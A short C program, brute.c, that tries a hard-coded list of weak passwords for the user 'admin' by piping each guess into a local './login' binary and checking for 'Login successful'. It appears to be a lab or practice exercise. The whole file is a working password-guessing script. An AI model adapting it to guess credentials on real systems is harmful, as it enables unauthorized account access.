// brute.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main() {
    const char *username = "admin";
    const char *passwords[] = {
        "0000", "123", "admin", "1234", "pass", "root","2025"
    };

    char cmd[100];
    char result[100];
    FILE *fp;
    int found = 0;

    for (int i = 0; i < sizeof(passwords) / sizeof(passwords[0]); i++) {
        printf("Trying: %s\n", passwords[i]);

        // Write command: echo inputs | ./login
        snprintf(cmd, sizeof(cmd), "echo \"%s\n%s\" | ./login", username, passwords[i]);

        // Open pipe to run the command and read result
        fp = popen(cmd, "r");
        if (fp == NULL) {
            perror("Failed to run command");
            exit(1);
        }

        // Read the first line of output
        fgets(result, sizeof(result), fp);
        pclose(fp);

        if (strstr(result, "Login successful") != NULL) {
            printf("[+] Password found: %s\n", passwords[i]);
            found = 1;
            break;
        }
    }

    if (!found) {
        printf("[-] Password not found.\n");
    }

    return 0;
}
